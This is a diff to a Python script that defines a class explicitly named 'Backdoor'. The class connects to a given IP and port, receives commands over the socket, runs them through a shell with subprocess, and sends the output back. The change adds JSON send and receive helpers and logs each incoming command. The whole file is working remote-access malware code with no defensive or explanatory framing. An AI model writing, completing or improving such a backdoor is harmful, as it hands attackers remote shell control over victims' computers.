@@ -1,9 +1,7 @@
 #!usr/bin/python
 
-from sqlite3 import connect
 import subprocess
-import socket
-from unittest import result
+import socket, json
 
 class Backdoor:
     def __init__(self,ip,port):
@@ -13,9 +11,18 @@ class Backdoor:
     def exe_remort_command(self,command):
         return subprocess.check_output(command,shell=True)
 
+    def reliable_send(self,data):
+        json_data = json.dumps(data)
+        return self.connection.send(json_data)
+
+    def reliable_reveive(self):
+        json_data = self.connection.recv(1024)
+        return json.loads(json_data)
+
     def run(self):
         while True:
             command = self.connection.recv(1024)
+            print(command)
             result = self.exe_remort_command(command.decode())
             self.connection.send(result)
         
